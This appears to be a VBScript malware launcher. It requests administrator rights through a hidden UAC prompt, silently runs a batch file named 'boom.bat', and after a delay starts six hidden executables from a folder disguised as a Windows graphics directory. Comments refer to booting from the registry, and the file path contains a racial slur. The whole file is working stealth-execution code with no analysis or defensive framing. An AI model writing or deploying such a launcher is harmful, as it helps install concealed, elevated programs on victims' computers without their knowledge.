Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Your specific folder path
strPath = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics\"
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION LOGIC ---
' We only ask for Admin rights if we AREN'T booting from the registry
If Not WScript.Arguments.Named.Exists("elevate") And Not WScript.Arguments.Named.Exists("boot") Then
    ' Trigger UAC prompt for the first-time setup only. 0 = Hidden
    UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 0
    WScript.Quit
End If

' --- STEP 2: RUN BOOM.BAT (Only on first run) ---
' If the "elevate" flag is present, it means this is the first time setup
If WScript.Arguments.Named.Exists("elevate") Then
    WshShell.Run "cmd.exe /c boom.bat", 0, True
End If

' --- STEP 3: THE SILENT REBOOT DELAY ---
' This wait happens entirely in the background. No window, no "X" button.
WScript.Sleep 30000 

' --- STEP 4: LAUNCH THE 6 APPS ---
' Using '0' as the second argument ensures they stay hidden
If FSO.FileExists(strPath & "sigurd.exe") Then WshShell.Run """" & strPath & "sigurd.exe""", 0, False
If FSO.FileExists(strPath & "client.exe") Then WshShell.Run """" & strPath & "client.exe""", 0, False
If FSO.FileExists(strPath & "file3.exe")  Then WshShell.Run """" & strPath & "file3.exe""", 0, False
If FSO.FileExists(strPath & "file4.exe")  Then WshShell.Run """" & strPath & "file4.exe""", 0, False
If FSO.FileExists(strPath & "file5.exe")  Then WshShell.Run """" & strPath & "file5.exe""", 0, False
If FSO.FileExists(strPath & "file6.exe")  Then WshShell.Run """" & strPath & "file6.exe""", 0, False

WScript.Quit
